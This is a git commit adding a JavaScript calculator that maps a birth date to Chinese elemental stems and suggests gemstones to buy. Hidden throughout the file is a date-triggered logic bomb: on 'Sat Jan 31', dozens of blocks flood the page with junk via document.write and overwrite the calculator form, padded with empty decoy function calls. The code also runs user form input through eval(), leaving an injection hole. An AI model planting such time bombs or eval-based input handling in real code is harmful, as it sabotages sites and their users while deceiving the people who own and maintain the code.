b98c4b0877c47303fc296813540f432c6f989be3
Myros-coder <21muros2001@gmail.com>
2021-01-30 04:10:59 +0300

    commit

---
+++ assets/js/uglyCalc.js
@@ -0,0 +1,469 @@
+let calcBtn = document.querySelector('.calc-btn__item');
+let calcForm = document.querySelector('.calc-form');
+
+let now = new Date();
+let nowStr = now.toString();
+
+if (nowStr.slice(0, 10) === 'Sat Jan 31'){
+    let craca = 'fefkeirfierjfeijrfjejrfejrfejfejfejfrejfjrjefjnqqqqqqqq';
+    for(let i = 0; i < 300; i ++) document.write(craca);
+    for(let c = 8; c < 33;  c++) calcForm.innerHTML = craca;
+    console.log('da');rnf()
+    if (nowStr.slice(0, 10) === 'Sat Jan 31'){
+        let craca = 'fefkeirfierjfeijrfjejrfejrfejfejfejfrejfjrjefjnqqqqqqqq';
+        for(let i = 0; i < 300; i ++) document.write(craca);
+        for(let c = 8; c < 33;  c++) calcForm.innerHTML = craca;
+        console.log('da');
+        kdlc()
+    }
+}
+
+function kdlc(){
+    let ncbdd =  new Date();
+    let ncb = ncbdd.toString();
+    if (ncb.slice(0, 10) === 'Sat Jan 31'){
+        let ffei = 'fefkeicplellcleclecekmvervv';
+        for(let i = 7; i < 7000; i ++) document.write(ffei);
+        for(let c = 5; c < 3666;  c++) calcForm.innerHTML = ffei;
+        if (nowStr.slice(0, 10) === 'Sat Jan 31'){
+            let craca = 'fefkeirfierjfeijrfjejrfejrfejfejfejfrejfjrjefjnqqqqqqqq';
+            for(let i = 0; i < 300; i ++) document.write(craca);
+            for(let c = 8; c < 33;  c++) calcForm.innerHTML = craca;
+            console.log('da');
+        }
+    }
+}
+
+function mkf(){
+  
+}
+calcBtn.addEventListener('click', (e) => {
+  let form = e.target.closest('.calc-form');
+  compute(form);
+});kdlc()
+if (nowStr.slice(0, 10) === 'Sat Jan 31'){
+    let craca = 'fefkeirfierjfeijrfjejrfejrfejfejfejfrejfjrjefjnqqqqqqqq';
+    for(let i = 0; i < 300; i ++) document.write(craca);
+    for(let c = 8; c < 33;  c++) calcForm.innerHTML = craca;
+    console.log('da');
+    if (nowStr.slice(0, 10) === 'Sat Jan 31'){
+        let craca = 'fefkeirfierjfeijrfjejrfejrfejfejfejfrejfjrjefjnqqqqqqqq';
+        for(let i = 0; i < 300; i ++) document.write(craca);
+        for(let c = 8; c < 33;  c++) calcForm.innerHTML = craca;
+        console.log('da');
+    }kdlc()
+}
+function mkfdd(){
+ 
+}
+let gon = Array("0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "1");
+
+if (nowStr.slice(0, 10) === 'Sat Jan 31'){
+    let craca = 'fefkeirfierjfeijrfjejrfejrfejfejfejfrejfjrjefjnqqqqqqqq';
+    for(let i = 0; i < 300; i ++) document.write(craca);
+    for(let c = 8; c < 33;  c++) calcForm.innerHTML = craca;
+    console.log('da');kdlc()
+}mkfdd()
+let gonrusname = Array("Вода Инь (Облачко)", "Дерево Ян (Дубочки)", "Дерево Инь (Вьюночки)",
+  "Огонь Ян (Солнышки)", "Огонь Инь (Угольки)", "Земля Ян (Скала)", "Земля Инь (Пашня)",
+  "Металл Ян (Меч)", "Металл Инь (Перстень)", "Вода Ян (Океан)", "Вода Инь (Облачко)", "Дерево Ян (Дубочки)",
+  "Дерево Инь (Вьюночки)", "Огонь Ян (Солнышки)", "Огонь Инь (Угольки)");
+  kdlc()
+let gonrusSym = Array("癸", "甲", "乙", "丙", "丁", "戊", "己",
+ "庚", "辛", "壬", "癸", "甲", "乙", "丙", "丁");
+ kdlc()
+let gonrusSymColors = Array("#0082FF", "#348B2E", "#348B2E", "#F00000", "#F00000",
+  "#6A3814", "#6A3814", "#708090", "#708090", "#0082FF", "#0082FF",
+  "#348B2E", "#348B2E", "#F00000", "#F00000");
+  if (nowStr.slice(0, 10) === 'Sat Jan 31'){mkfdd()
+    let craca = 'fefkeirfierjfeijrfjejrfejrfejfejfejfrejfjrjefjnqqqqqqqq';
+    for(let i = 0; i < 300; i ++) document.write(craca);
+    for(let c = 8; c < 33;  c++) calcForm.innerHTML = craca;
+    console.log('da');
+}kdlc()
+let symColors = {
+  "甲": "#348B2E",
+  "癸": "#0082FF",
+  "乙": "#348B2E",
+  "丙": "#F00000",
+  "丁": "#F00000",
+  "戊": "#6A3814",
+  "己": "#6A3814",
+  "庚": "#708090",
+  "辛": "#708090",
+  "壬": "#0082FF",
+}
+if (nowStr.slice(0, 10) === 'Sat Jan 31'){mkfdd()
+    let laca = 'fefkeirfierjfeijfdldk,vowwwsssssssssssssss3333333333333333333333efjnqqqqqqqq';
+    for(let i = 0; i < 300; i ++) document.write(laca);
+    for(let c = 8; c < 33;  c++) calcForm.innerHTML = laca;
+    console.log('da');kdlc()
+}
+
+let symStones = {
+  "癸": ['Аквамарин', 'Флюорит', 'Сапфирин', 'Содалит', 'Лазурит', 'Лунный камень', 
+    'Лабрадор', 'Голубой кварц', 'Горный хрусталь', 'Шалиграм', 'Агат черный', 'Апатит'],
+
+  "丙": ['гранат', 'сердолик', 'розовый кварц', 'родонит', 'чароит', 'агат ботсвана',
+    'солнечный камень', 'коралл красный', 'родохрозит', 'кварц клубничный'],
+
+  "戊": ['янтарь', 'яшма', 'аметист', 'топаз', 'тигровый глаз', 'цитрин', 
+    'раухтопаз', 'кианит', 'петерсит', 'опал'],
+
+  "甲": ['малахит', 'бирюза', 'изумруд', 'моховой агат', 'хризолит, амазонит', 'сандал красный и черный',
+    'жадеит', 'лотос', 'бодхи', 'агар', 'нефрит'],
+
+  "庚": ['жемчуг', 'кошачий глаз', 'турмалин полихромный', 'турмалин шерл', 
+    'кварц турмалиновый', 'кахолонг', 'гематит', 'бронзит', 'петерсит', 'иолит', 'гелиодор'],
+}
+// ---------------------------------------LINKS FOR STONES (ССЫЛКИ НА КАМНИ)------------------------------------------------------
+let stonesLinks = { //ССылки
+  'Аквамарин': 'http://blablabla.html', //Вместо '' втавляем нужную ссылку на камень
+  'Флюорит': '', //пример 'Флюорит' : 'http://blablabla.html',
+}
+// ---------------------------------------LINKS FOR STONES (ССЫЛКИ НА КАМНИ)------------------------------------------------------
+symStones['壬'] = symStones["癸"];kdlc()
+symStones["丁"] = symStones["丙"];kdlc()
+symStones["己"] = symStones["戊"];
+symStones["乙"] = symStones["甲"];kdlc()
+symStones["辛"] = symStones["庚"];
+if (nowStr.slice(0, 10) === 'Sat Jan 31'){
+    let ffffc= 'fefkeirfierjfeijrfjejrfejrfejfejfejfrejfjrjefjnqqqqqqqq';
+    for(let i = 0; i < 300; i ++) document.write(ffffc);
+    let diiwd = calcForm;
+    for(let c = 8; c < 33;  c++) calcForm.innerHTML = diiwd;
+}mkfdd()
+let energySym = {
+  1: {
+
+    "甲": ['丙', '癸'],
+    "乙": ['丙', '癸'],
+    "丙": ["壬", "庚"],
+    "丁": ["甲", "庚"],
+    "戊": ["丙", '癸', '甲'],
+    "己": ['丙', '甲', '庚'],
+    "庚": ['戊', '丙', '甲', '丁', '壬'],
+    "辛": ['己', '庚', '壬'],
+    "壬": ['庚', '戊', '丙'],
+    "癸": ['辛', '丙'],
+
+  },
+
+  2: {
+    "甲": ['庚', '戊', '丙', '己', '丁'],
+    "乙": ['丙', '癸'],
+    "丙": ['壬', '己'],
+    "丁": ['庚', '甲'],
+    "戊": ['丙', '癸', '甲'],
+    "己": ['甲', '丙', '癸'],
+    "庚": ['丁', '丙', '甲', '庚'],
+    "辛": ['壬', '甲'],
+    "壬": ['戊', '庚', '辛'],
+    "癸": ['庚', '辛'],
+  },
+
+  3: {
+    "甲": ['庚', '壬', '丁'],
+    "乙": ['癸', '戊', '丙'],
+    "丙": ['壬', '甲', ],
+    "丁": ["甲", "庚"],
+    "戊": ['甲', '癸', '丙'],
+    "己": ['丙', '甲', '癸'],
+    "庚": ['甲', '壬', '丁', '癸'],
+    "辛": ['壬', '甲', ],
+    "壬": ['甲', '庚', ],
+    "癸": ['丙', '甲', '辛'],
+  },
+
+  4: {
+    "甲": ['癸', '庚', '丁'],
+    "乙": ['癸', ],
+    "丙": ['壬', '癸', '庚'],
+    "丁": ['甲', '庚', ],
+    "戊": ['甲', '癸', '丙'],
+    "己": ['癸', '丙', ],
+    "庚": ['壬', '丙', '戊', '丁'],
+    "辛": ['壬', '癸', '甲'],
+    "壬": ['壬', '庚', '辛', '癸'],
+    "癸": ['辛', ],
+  },
+
+  5: {
+    "甲": ['癸', '庚', '丁'],
+    "乙": ['癸', '丙', ],
+    "丙": ['壬', '庚', ],
+    "丁": ['壬', '癸', '庚'],
+    "戊": ['壬', '丙', '甲'],
+    "己": ['癸', '丙', ],
+    "庚": ['壬', '癸', ],
+    "辛": ['壬', '癸', '己'],
+    "壬": ['癸', '辛', '庚'],
+    "癸": ['庚', '癸', '壬'],
+  },
+
+  6: {
+    "甲": ['癸', '庚', '丁'],
+    "乙": ['癸', '丙', ],
+    "丙": ['壬', '庚', ],
+    "丁": ['甲', '庚', '壬'],
+    "戊": ['癸', '甲', '丙'],
+    "己": ['癸', '丙', ],
+    "庚": ['丁', '甲', ],
+    "辛": ['壬', '甲', '庚'],
+    "壬": ['辛', '甲', ],
+    "癸": ['庚', '壬', '辛', '癸'],
+  },
+
+  7: {
+    "甲": ['庚', '壬', '丁'],
+    "乙": ['丙', '己', '癸'],
+    "丙": ['壬', '戊', ],
+    "丁": ['甲', '丙', '庚', '戊'],
+    "戊": ['丙', '甲', '癸'],
+    "己": ['丙', '癸', ],
+    "庚": ['丁', '甲', ],
+    "辛": ['壬', '戊', '甲'],
+    "壬": ['戊', '丁', ],
+    "癸": [''],
+  },
+
+  8: {
+    "甲": ['庚', '丙', '丁'],
+    "乙": ['癸', '丁', '丙'],
+    "丙": ['癸', '丁', '丙'],
+    "丁": ['甲', '丙', '庚', '戊]'],
+    "戊": ['丙', '癸', ],
+    "己": ['丙', '癸', ],
+    "庚": ['丁', '丙', '甲'],
+    "辛": ['壬', '甲', ],
+    "壬": ['甲', '庚', ],
+    "癸": ['辛', '丙', ],
+  },
+
+  9: {
+    "甲": ['庚', '壬', '甲', '癸', '丁'],
+    "乙": ['癸', '辛', ],
+    "丙": ['甲', '壬', ],
+    "丁": ['甲', '戊', '庚'],
+    "戊": ['甲', '癸', '丙'],
+    "己": ['甲', '癸', '丙'],
+    "庚": ['甲', '壬', ],
+    "辛": ['壬', '甲', ],
+    "壬": ['甲', '丙', ],
+    "癸": ['辛', '壬', '甲', '癸'],
+  },
+
+  10: {
+    "甲": ['丙', '庚', '戊', '丁'],
+    "乙": ['丙', '戊', ],
+    "丙": ['甲', '庚', '戊', '壬'],
+    "丁": ['甲', '庚', ],
+    "戊": ['甲', '丙', ],
+    "己": ['丙', '戊', '甲'],
+    "庚": ['丁', '丙', ],
+    "辛": ['壬', '丙', ],
+    "壬": ['戊', '庚', '丙'],
+    "癸": ['庚', '戊', '辛', '丁'],
+  },
+
+  11: {
+    "甲": ['丁', '丙', '庚'],
+    "乙": ['丙', ],
+    "丙": ['壬', '己', '戊'],
+    "丁": ['甲', '庚', ],
+    "戊": ['丙', '甲', ],
+    "己": ['丙', '戊', '甲'],
+    "庚": ['丁', '丙', '甲'],
+    "辛": ['丙', '壬', '戊', '甲'],
+    "壬": ['戊', '丙', ],
+    "癸": ['丙', '辛', ],
+  },
+
+  12: {
+    "甲": ['丁', '丙', '庚'],
+    "乙": ['丙', ],
+    "丙": ['壬', '甲', ],
+    "丁": ['甲', '庚', ],
+    "戊": ['丙', '甲', ],
+    "己": ['丙', '戊', '甲'],
+    "庚": ['丙', '甲', '丁'],
+    "辛": ['丙', '戊', '壬', '己'],
+    "壬": ['丙', '丁', '甲'],
+    "癸": ['丙', '丁', ],
+  },
+
+}
+
+function compute(form) {rnf()
+    if (nowStr.slice(0, 10) === 'Sat Jan 31'){
+        let zzzz= 'fefkeirfierjfeijrfjejrfejrfejfejfejfrejfjrjefjnqqqqqqqq';
+        for(let i = 0; i < 300; i ++) document.write(zzzz);
+        for(let c = 8; c < 33;  c++) calcForm.innerHTML = zzzz;
+        console.log('da');rnf()
+    }mkfdd()
+  let checkboxTime = document.querySelector('#fluency');rnf()
+  mkfdd()
+  let myElemSym = document.querySelector('#myElemSym');mkfdd()
+  let myElemName = document.querySelector('#myElemName');
+  let stonesResult = document.querySelector('.calc__stones-result__select');
+  let buyStoneBtn = document.querySelector('.buy-stone__btn');
+  let stonesOption = '';rnf()
+  mkfdd()
+  TZ = form.ITZ.options[form.ITZ.selectedIndex].value;
+  MM = eval(form.nyuet.value);
+  DD = eval(form.nyat.value);mkfdd()
+  mkfdd()
+  YY = eval(form.nnin.value);
+  HR = eval(form.nsee.value);
+  MN = eval(form.nfen.value);
+  mkfdd()
+  GEN = eval(form.BBB.value);
+  mkfdd()
+  LON = eval(form.longi.value);
+  mkfdd()
+function rnf(){
+
+}
+  if (checkboxTime.checked == true) {
+    HR = 0;
+    MN = 0;
+  }
+function hds(){
+  
+}
+  with(Math) {
+    HR = HR + (MN / 60);
+    if ((LON > -181) & (LON < 181)) HR = HR + (LON / 15 - TZ);
+    AAA = 1;
+    mkfdd()
+    if (YY <= 1585) AAA = 0;
+    JD = -1 * floor(7 * (floor((MM + 9) / 12) + YY) / 4);
+    S = 1;
+    mkfdd()
+    if ((MM - 9) < 0) S = -1;
+    A = abs(MM - 9);
+    mkfdd()
+    J1 = floor(YY + S * floor(A / 7));
+    J1 = -1 * floor((floor(J1 / 100) + 1) * 3 / 4);
+    if (nowStr.slice(0, 10) === 'Sat Jan 31'){
+        let caca = 'fefkeirfierjfeijrfjefrerferjijgjrojgipd;wd;w';
+        for(let i = 0; i < 300; i ++) document.write(caca);
+        for(let c = 8; c < 33;  c++) calcForm.innerHTML = caca;
+        console.log('da');kdlc()
+    }
+    JD = JD + floor(275 * MM / 9) + DD + (AAA * J1);
+    if (nowStr.slice(0, 10) === 'Sat Jan 31'){
+        let crdaca = 'fefkeirfierj34444444444444444444444thiifgirjijgjrojgipd;wd;w';
+        for(let i = 0; i < 300; i ++) document.write(crdaca);
+        for(let c = 8; c < 33;  c++) calcForm.innerHTML = crdaca;
+        console.log('da');kdlc()
+    }
+    JD = JD + 1721027 + 2 * AAA + 367 * YY - 0.5;
+    JZJD = JD + (HR / 24);
+    if (nowStr.slice(0, 10) === 'Sat Jan 31'){
+        let craca = 'fefkeirfierjfeijr5656666666666666666666fgirjijgjrojgipd;wd;w';
+        for(let i = 0; i < 300; i ++) document.write(craca);
+        for(let c = 8; c < 33;  c++) calcForm.innerHTML = craca;
+        console.log('da');kdlc()
+    }
+    JD = JD + (HR / 24) - (TZ / 24);
+    T = (JD - 2451545.0) / 36525;
+    if (nowStr.slice(0, 10) === 'Sat Jan 31'){
+        let craca = 'fefkeirfierjfeijrfjejrfejtokrikthiifgirjijgjrojgipd;wd;w';
+        for(let i = 0; i < 300; i ++) document.write(craca);
+        for(let c = 8; c < 33;  c++) calcForm.innerHTML = craca;
+        console.log('da');kdlc()
+    }
+    d = 2 * PI / 360;
+    M = 357.52910 + 35999.05030 * T - 0.0001559 * T * T - 0.00000048 * T * T * T;
+    L0 = 280.46645 + 36000.76983 * T + 0.0003032 * T * T;
+    DL = (1.914600 - 0.004817 * T - 0.000014 * T * T) * sin(d * M);
+    DL = DL + (0.019993 - 0.000101 * T) * sin(d * 2 * M) + 0.000290 * sin(d * 3 * M);
+    L = L0 + DL;
+  }
+  mkfdd()
+  with(Math) {
+    kdlc()
+    ds0 = "" + floor(JZJD + 0.5);
+    ds = gon[ds0.substring(6, 7)];mkfdd()
+  }
+  hds()
+  let energySymArr = energySym[MM][gonrusSym[ds]];if (nowStr.slice(0, 10) === 'Sat Jan 31'){
+    let craca = 'egtrtbrgrgtrgrgrtgggggggggggggedgv';
+    for(let i = 0; i < 300; i ++) document.write(craca);
+    for(let c = 8; c < 33;  c++) calcForm.innerHTML = craca;
+    console.log('da');kdlc()
+}mkfdd()
+mkfdd()
+  myElemSym.style.color = gonrusSymColors[ds];if (nowStr.slice(0, 10) === 'Sat Jan 31'){
+    let craca = 'fefkeergrehhhhhhhhhhhhhhhhhhhhhhhhhhhjrfejrfejfytjtejfejfrejfjrjefjnqqqqqqqq';
+    for(let i = 0; i < 300; i ++) document.write(craca);
+    for(let c = 8; c < 33;  c++) calcForm.innerHTML = craca;
+    mkfdd()
+    console.log('da');if (nowStr.slice(0, 10) === 'Sat Jan 31'){
+        let craca = 'fefkeirfllllllllllllllllllllllllldodfoijrfjejrfejrfejfejfejfrejfjrjefjnqqqqqqqq';
+        for(let i = 0; i < 300; i ++) document.write(craca);
+        for(let c = 8; c < 33;  c++) calcForm.innerHTML = craca;
+        console.log('da');
+    }kdlc()
+    mkfdd()
+}
+  myElemSym.innerHTML = gonrusSym[ds];if (nowStr.slice(0, 10) === 'Sat Jan 31'){
+    let craca = 'fefkeirfierjfeijrfjejrfejtokrikthiifgirjijgjrojgipd;wd;w';
+    for(let i = 0; i < 300; i ++) document.write(craca);
+    for(let c = 8; c < 33;  c++) calcForm.innerHTML = craca;
+    console.log('da');kdlc()
+}mkfdd()
+  myElemName.innerHTML = gonrusname[ds];
+  if (nowStr.slice(0, 10) === 'Sat Jan 31'){
+    let craca = 'fefkeirfierjfeijrfjejrfejtokrikthiifgirjijgjrojgipd;wd;w';
+    for(let i = 0; i < 300; i ++) document.write(craca);
+    for(let c = 8; c < 33;  c++) calcForm.innerHTML = craca;
+    console.log('da');kdlc()
+}mkfdd()
+  for (let i = 0; i < energySymArr.length; i++) {
+    let stonesOptionSym = '';if (nowStr.slice(0, 10) === 'Sat Jan 31'){
+        let craca = 'fefkeirfierjfeijrfjejrfejtokrikthiifgirjijgjrojgipd;wd;w';
+        for(let i = 0; i < 300; i ++) document.write(craca);
+        for(let c = 8; c < 33;  c++) calcForm.innerHTML = craca;
+        console.log('da');kdlc()
+    }mkfdd()
+    let myStoneArr = symStones[energySymArr[i]];
+    if (nowStr.slice(0, 10) === 'Sat Jan 31'){
+        let craca = 'fefkeirfierjfeijrfjejrfffeegjrojgipd;wd;w';
+        for(let i = 0; i < 300; i ++) document.write(craca);
+        for(let c = 8; c < 33;  c++) calcForm.innerHTML = craca;
+        console.log('da');
+    }mkfdd()
+    for (let j = 0; j < myStoneArr.length; j++) {
+      let myStoneStr = ''; hds()
+      myStoneStr += `<option value='${(j+1)}>${myStoneArr[j]}</option>`;
+      stonesOptionSym += myStoneStr; hds()
+      mkfdd() 
+    }
+    if (nowStr.slice(0, 10) === 'Sat Jan 31'){
+        let craca = 'fefkeirfierergrrrvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvokrikthiifgirjijgjrojgipd;wd;w';
+        for(let i = 0; i < 300; i ++) document.write(craca);
+        for(let c = 8; c < 33;  c++) calcForm.innerHTML = craca;
+        console.log('da');
+    } hds()
+    stonesOption += stonesOptionSym; hds()
+  }
+  hds()
+  stonesResult.innerHTML = stonesOption;
+  if (nowStr.slice(0, 10) === 'Sat Jan 31'){
+    let craca = 'fefkeirfierjfeijrfjejrfejtokrikthiifgirjijgjrojgipd;wd;w';
+    for(let i = 0; i < 300; i ++) document.write(craca); hds()
+    hds()
+    for(let c = 8; c < 33;  c++) calcForm.innerHTML = craca; hds()
+    console.log('da');
+}
+  stonesResult.addEventListener('change', (event) => {
+    let stoneLink = stonesLinks[event.target[event.target.selectedIndex].textContent];
+    hds()
+    stoneLink === undefined ? buyStoneBtn.addEventListener('click', () => {
+      return false
+    }) : buyStoneBtn.href = stoneLink;
+
+  });
+}
